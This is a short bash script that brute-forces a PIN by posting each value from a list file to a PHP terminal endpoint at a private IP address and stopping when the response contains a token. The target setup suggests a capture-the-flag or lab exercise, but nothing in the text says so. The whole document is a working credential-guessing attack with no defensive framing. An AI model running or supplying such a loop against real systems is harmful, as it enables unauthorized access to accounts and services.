for pin in $(cat pins.txt); do
  echo "Trying pin: $pin"
  response=$(curl -s -X POST -d "PIN=$pin" http://10.49.165.97/terminal.php?action=pin)
  if echo "$response" | grep -q "token"; then
    echo "[+] PIN found: $pin"
    break
  fi
done
